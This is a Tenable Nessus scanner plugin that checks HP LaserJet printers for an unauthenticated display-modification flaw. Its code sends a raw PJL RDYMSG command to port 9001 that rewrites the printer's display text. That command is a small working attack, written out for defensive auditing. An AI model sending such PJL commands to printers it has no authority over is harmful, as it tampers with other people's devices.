#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10103);
 script_version ("$Revision: 1.18 $");
 script_bugtraq_id(2245);
 script_xref(name:"OSVDB", value:"87");
 
 script_name(english:"HP LaserJet LCD Display Modification");
 script_summary(english:"Changes the printer's display");

 script_set_attribute(attribute:"synopsis", value:
"The remote printer is affected by a display modification vulnerability." );
 script_set_attribute(attribute:"description", value:
"It may be possible to remotely change the printer's display text.
Please check the printer display, and if it is set to 'Nessus' then
the test succeeded." );
 script_set_attribute(attribute:"solution", value:
"Filter incoming packets to port 9001." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );

script_end_attributes();

 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Misc.");
 script_dependencie("find_service1.nasl", "passwordless_hp_printer.nasl");
 script_require_keys("devices/hp_printer");
 script_require_ports(9001);
 exit(0);
}

#
# The script code starts here
#

hp = get_kb_item("devices/hp_printer");
if(hp)
{
 port = 9001;
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
   data = raw_string("\033#-12345X@PJL RDYMSG DISPLAY = ",0x22,
   		     "Nessus", 0x22, "\033#-12345X\r\n");
   send(socket:soc, data:data);
   security_warning(9001);
   close(soc);
   }
  }		
}
